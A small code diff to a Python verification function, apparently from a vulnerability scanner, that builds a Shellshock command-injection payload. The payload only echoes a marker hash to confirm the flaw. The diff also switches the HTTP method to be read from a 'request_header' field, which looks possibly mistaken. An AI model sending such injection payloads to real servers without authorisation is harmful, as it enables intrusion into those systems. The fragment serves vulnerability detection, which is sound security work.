@@ -17,7 +17,7 @@ def verify(task):
     }
 
     url = task['url']
-    method = task['method']
+    method = task['request_header']
     data = task['request_content'] if method == 'POST' else None
     # url =  'http://%s:%s/' % (ip, port)
     payload = '''() { :;}; echo 1a8b8e54b53f63a4efae84e064373f12:'''
